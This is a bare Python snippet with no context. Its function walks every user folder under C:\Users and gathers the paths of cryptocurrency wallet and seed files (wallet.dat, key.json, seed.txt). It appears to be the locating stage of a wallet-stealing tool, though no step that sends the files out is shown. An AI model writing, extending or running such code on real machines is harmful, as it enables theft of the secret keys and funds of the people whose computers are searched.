import os

def find_wallet_seeds():
    found = []
    for root, _, files in os.walk("C:\\Users"):
        for file in files:
            if file.lower() in ["wallet.dat", "key.json", "seed.txt"]:
                found.append(os.path.join(root, file))
        if len(found) > 5:
            break
    return found
